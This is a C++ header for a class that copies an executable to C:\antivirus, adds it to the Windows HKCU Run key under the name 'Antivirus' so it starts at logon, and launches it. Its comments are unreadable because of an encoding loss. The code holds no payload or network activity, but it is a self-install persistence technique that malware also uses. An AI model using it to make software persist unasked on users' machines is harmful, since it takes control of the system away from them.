#pragma once
#include <iostream>
#include <filesystem>
#include <sys/stat.h>
#include <sys/types.h>
#include "Utils.h"

using namespace std;
using namespace std::filesystem;

class Transfer {

private:
	path antivirusPath = path("C:\\antivirus");
	path currentPath;
	bool status;

public: Transfer(path path) {
	this->currentPath = path;
	this->antivirusPath.append(path.filename().string());
}
public: bool isMoved() {
	if (antivirusPath.compare(currentPath) == 0) {
		return status = true;
	}
	else {
		return status = false;
	}
}
	  // ���������� ��������� � ������� ����
public: bool move() {
	// ���������� ���� ���������� � ������� ����
	if (antivirusPath.compare(currentPath) == 0) {
		return status = true;
	}

	// ������� ����������, � ������ � ����������
	createDirectory();


	// ��������� ���������� �� ����
	if (fileExists(antivirusPath)) {
		return status = true;
	}

	// �������� ���� � ������� ����
	copy(currentPath, antivirusPath);
	regedit();

	// ��������� ��������� �� �������� ����
	startup();
	return status = true;
}

	  // ������� ����������
private: void createDirectory() {
	create_directory(antivirusPath.parent_path());
}

private: void regedit() {
	std::wstring progPath = antivirusPath.wstring();
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	LONG status = RegSetValueEx(hkey, L"Antivirus", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
}
	   // ������ ����������.
public: VOID startup()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// ��������� ������� ���������
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// ������ ���������
	CreateProcess(antivirusPath.wstring().c_str(),
		NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	// ��������� ���������� ������� � �����
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

};